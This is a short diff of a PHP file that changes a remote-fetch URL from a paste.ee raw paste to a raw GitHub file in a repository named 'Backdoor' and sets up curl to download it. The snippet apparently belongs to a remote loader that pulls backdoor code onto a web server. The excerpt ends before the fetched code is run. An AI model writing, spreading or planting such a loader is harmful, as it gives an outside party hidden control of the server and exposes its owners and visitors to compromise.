@@ -1,5 +1,5 @@
 <?php 
-$link = 'https://paste.ee/r/O86EgV04';
+$link = 'https://raw.githubusercontent.com/ItsMeAlf404/Backdoor/refs/heads/main/awok.php';
 $ch = curl_init(); 
 curl_setopt($ch, CURLOPT_URL, $link);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
